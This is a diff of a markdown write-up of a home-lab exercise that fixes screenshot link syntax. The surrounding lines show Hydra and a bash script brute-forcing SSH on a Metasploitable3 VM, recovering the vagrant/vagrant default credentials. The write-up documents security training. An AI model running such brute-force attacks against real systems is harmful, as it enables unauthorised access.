@@ -48,7 +48,7 @@ Confirmed Kali can reach Metasploitable3 via ping:
 ping 192.168.56.103
 ```
 
-[![Screenshot of results]](image-10.png)
+![Screenshot of results] (image-10.png)
 
 ### 2. Created Username and Password Lists
 
@@ -61,7 +61,7 @@ postgres
 vagrant
 ```
 
-[![Screenshot of results]](image-8.png)
+![Screenshot of results](image-8.png)
 
 **pass.txt**
 
@@ -73,7 +73,7 @@ password
 vagrant
 ```
 
-[![Screenshot of results]](image-9.png)
+![Screenshot of results](image-9.png)
 
 ### 3. Ran Hydra Using Both Files
 
@@ -88,7 +88,7 @@ Result:
 - Hydra successfully found the credentials:
   - **Username:** `vagrant`
   - **Password:** `vagrant`
-    [![Screenshot of results]](image-11.png)
+    ![Screenshot of results](image-11.png)
 
 ## Phase 1.2 – Custom Scripted Attack (Hydra + Bash)
 
@@ -108,7 +108,7 @@ echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
 hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
 ```
 
-[![Screenshot of results]](image-7.png)
+![Screenshot of results](image-7.png)
 
 ### 2. Ran the Script
 
@@ -121,7 +121,7 @@ Output confirmed the attack was successful with valid credentials found:
 
 - **Username:** `vagrant`
 - **Password:** `vagrant`
-  [![Screenshot of results]](image-5.png)
+  ![Screenshot of results](image-5.png)
 
 ## Conclusion
 
